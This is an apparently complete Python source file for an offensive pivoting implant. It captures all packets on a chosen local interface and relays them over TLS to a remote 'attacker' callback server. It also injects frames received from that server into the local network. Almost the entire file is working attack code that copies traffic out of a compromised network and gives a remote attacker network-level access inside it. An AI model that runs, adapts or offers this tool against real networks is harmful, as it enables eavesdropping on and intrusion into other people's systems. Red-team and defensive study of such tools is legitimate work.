#!/usr/bin/env python
# -*- coding: utf-8 -*-

from argparse import ArgumentParser
from select import select
from threading import Thread
import socket
import ssl
import sys
import traceback

import netifaces
import pcapy

__author__ = "Zhao Xiang Lim"
__copyright__ = "Copyright 2017 Zhao Xiang."
__license__ = "Apache License 2.0"

DEBUG = False
SOCK_MTU = 1500


def print_status(buf, debug_msg=False):
    if (debug_msg and DEBUG) or not debug_msg:
        print("[*] {0}".format(buf))

def print_good(buf, debug_msg=False):
    if (debug_msg and DEBUG) or not debug_msg:
        print("[+] {0}".format(buf))

def print_bad(buf, debug_msg=False):
    if (debug_msg and DEBUG) or not debug_msg:
        print("[-] {0}".format(buf))

def print_error(buf, debug_msg=False):
    if (debug_msg and DEBUG) or not debug_msg:
        print("[!] {0}".format(buf))

def print_debug(buf):
    if DEBUG:
        print("[DEBUG] {0}".format(buf))


class HandlerInterface():
    """Class for creating sniffing handler."""

    def __init__(self, local_ip, callback_ip):
        """
        HandlerInterface init function.

        Args:
            local_ip (str):     The IPv4 Address to pivot on.
            callback_ip (str):  The callback server's IPv4 address.
        """
        self.ip = local_ip
        self.dev = self.__get_interface()
        self.handler = self.__get_handler(callback_ip)

    def __get_interface(self):
        """Returns the name of the network interface for a given IPv4 address."""
        devices_long = pcapy.findalldevs()
        devices = netifaces.interfaces()
        for d in devices:
            for addrs in netifaces.ifaddresses(d)[netifaces.AF_INET]:
                for key, value in addrs.items():
                    if key == "addr" and value == self.ip:
                        for dev in devices_long:
                            if d in dev:
                                return dev
        print_error("No valid network interface found for IP address: {0}".format(self.ip))
        return None

    def __get_handler(self, callback_ip):
        """
        Open the sniffing handler.

        A filter to ignore packets from the callback server is set here.

        Args:
            callback_ip (str):  The callback server's IPv4 address.
        """
        try:
            if not self.dev:
                return None
            handler = pcapy.open_live(self.dev, 65535, 1, 0)
            handler.setfilter("not host {0}".format(callback_ip))
            return handler
        except Exception as e:
            if DEBUG:
                print_error(e)
                traceback.print_exc()
            return None


class Callback():
    """Class for server callback management."""

    def __init__(self, callback_ip, callback_port, insecure):
        """
        Callback init function.

        Args:
            callback_ip (str):      The callback server's IPv4 address.
            callback_port (int):    The callback server's TCP port.
            insecure (bool):        Whether to disable TLS encryption.
        """
        self.__callback_ip = callback_ip
        self.__callback_port = callback_port
        self.__insecure = insecure
        self.sock = self.__connect()

    def __connect(self):
        """Connects to the callback server."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)

            if self.__insecure:
                # No encryption.
                callback_sock = sock
            else:
                # Create SSL context wrapper for the socket.
                wrapper = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
                wrapper.options &= ssl.OP_CIPHER_SERVER_PREFERENCE
                # Self-signed certificate is used so verification is disabled.
                wrapper.check_hostname = False
                wrapper.verify_mode = ssl.CERT_NONE
                callback_sock = wrapper.wrap_socket(sock, server_side=False)

            callback_sock.connect((self.__callback_ip, self.__callback_port))
            return callback_sock
        except Exception as e:
            if DEBUG:
                print_error(e)
                traceback.print_exc()
            return None

    def disconnect(self, server_close=False):
        """
        Disconnect from callback server.

        Args:
            server_close (bool):    Whether callback server triggered the closure.
        """
        try:
            if self.sock:
                print_status("Closing socket connection...")
                if not server_close:
                    # Inform the server connection is closing.
                    self.send_frame("CLIENT_CLOSE")
                self.sock.shutdown(socket.SHUT_RDWR)
                self.sock.close()
                self.sock = None
            return True
        except Exception as e:
            if DEBUG:
                print_error(e)
                traceback.print_exc()
            return None

    def send_frame(self, buf):
        """
        Send a frame to the callback server.

        Args:
            buf:    Data to send to callback server.
        """
        # Sanity check.
        if not self.sock:
            print_bad("Socket connection is not open.")
            return False

        try:
            send_len = 0

            # Send the size of the buffer (In network byte order)
            # to the server first.
            buf_size = len(buf)
            self.sock.sendall(str(socket.htons(buf_size)))

            print_debug("Sending: {0} bytes".format(buf_size))

            # Split the buffer into chunks of size matching the MTU.
            chunks = [buf[i:i+SOCK_MTU] for i in range(0, buf_size, SOCK_MTU)]

            for chunk in chunks:
                self.sock.sendall(chunk)
                send_len = send_len + len(chunk)
                print_debug("Sending: {0}/{1} bytes".format(send_len, buf_size))

            assert buf_size == send_len
            print_debug("Sent total: {0} bytes".format(buf_size))
            return True
        except Exception as e:
            if DEBUG:
                print_error(e)
                traceback.print_exc()
            return None

    def recv_frame(self, handler):
        """
        Receive a frame from the callback server and inject it to the network.

        Args:
            handler:    The sniffer handler.
        """
        # Sanity check.
        if not self.sock:
            print_bad("Socket connection is not open.")
            return False

        try:
            read_len, read_size, buf_left = 0, 0, 0
            buf_fragment = []

            # Receive the size of the buffer (In network byte order)
            # from the server first.
            buf_size = socket.ntohs(int(self.sock.recv(5)))
            print_debug("Receiving: {0} bytes".format(buf_size))

            # Receive the actual buffer, with respect to the MTU.
            while read_len < buf_size:
                buf_left = buf_size - read_len

                if buf_left > SOCK_MTU:
                    read_size = SOCK_MTU
                else:
                    read_size = buf_left

                buf_fragment.append(self.sock.recv(read_size))
                read_len = read_len + read_size
                print_debug("Received: {0}/{1} bytes".format(read_len, buf_size))

            # Join the buffer fragments into one.
            buf = "".join(buf_fragment)

            # Ensure the final buffer size is what the server
            # expected it to be.
            assert buf_size == len(buf)

            print_debug("Received total: {0} bytes".format(buf_size))

            # Inject the frame to the network.
            handler.sendpacket(buf)
            print_debug("Injected: {0} bytes".format(len(buf)))
            return True
        except ValueError as e:
            # Raised by socket.ntohs(). This is due to the server
            # terminating the connection abruptly. Can be safely
            # handled by closing the connection and calllback client.
            return None
        except Exception as e:
            if DEBUG:
                print_error(e)
                traceback.print_exc()
            return None


class Sniffer(Thread):
    """Class for sniffer handler management."""

    def __init__(self, handler, callback):
        """
        Sniffer init function.

        Args:
            handler (HandlerInterface.handler): The sniffing handler.
            callback (socket):                  The socket containing the server callback.
        """
        self.handler = handler
        self.__callback = callback
        self.__started = True
        Thread.__init__(self)

    def run(self):
        """Run the sniffer and handle the sniffed packets."""
        while self.__started:
            packet_header, packet_data = self.handler.next()
            print_debug("Sniffed: {0} bytes".format(packet_header.getlen()))
            self.__packet_handler(packet_data)

    def stop(self):
        """Stop the sniffer."""
        self.__started = False

    def __packet_handler(self, packet_data):
        """
        Handle the sniffed packets.

        Args:
            packet_data:    The data of the sniffed packet.
        """
        if self.__callback.send_frame(packet_data) is False:
            print_bad("Socket connection is not open.")
            self.stop()


def parse_arguments():
    parser = ArgumentParser()

    parser.add_argument("ip", type=str,
                        help="The local IP address to pivot on.")
    parser.add_argument("callback", type=str,
                        help="The callback (Attacker) IP address to connect back to.")
    parser.add_argument("-p", "--port", type=int, default=443,
                        help="The callback (Attacker) port to connect back to.")
    parser.add_argument("-I", "--insecure", action="store_true", default=False,
                        help="Disable encrypted callback via TLS encryption (HTTPS).")
    parser.add_argument("-d", "--debug", action="store_true", default=False,
                        help="Enable debugging mode (Verbose output).")

    args = parser.parse_args()
    if not args.ip or not args.callback:
        parser.print_help()
        return None
    return args


def main():
    args = parse_arguments()

    if not args:
        return 1
    
    if args.debug:
        global DEBUG
        DEBUG = True
        print_debug("Debugging enabled.")

    server_close = False

    handler = HandlerInterface(args.ip, args.callback)
    # Sanity check.
    if not handler.handler:
        return 1

    callback = Callback(args.callback, args.port, args.insecure)
    # Sanity check.
    if not callback.sock:
        return 1

    sniffer = Sniffer(handler.handler, callback)

    try:
        # Sniff packets in network and send it to the callback server.
        sniffer.daemon = True
        sniffer.start()
        print_status("Started callback on interface {0}.".format(handler.dev))

        # Receive from callback server and send to network.
        while True:
            r, w, x = select([callback.sock], [], [])
            if callback.sock in r:
                result = callback.recv_frame(handler.handler)
                if result is None:
                    break
                elif result is False:
                    server_close = True
                    break
    except KeyboardInterrupt, SystemExit:
        # Line break.
        print("")
        print_bad("Keyboard interrupt detected.", True)
    except Exception as e:
        if DEBUG:
            print_error(e)
            traceback.print_exc()
        return 1
    finally:
        sniffer.stop()
        callback.disconnect(server_close)
        print_status("Exiting...")
    return 0


if __name__ == "__main__":
    sys.exit(main())
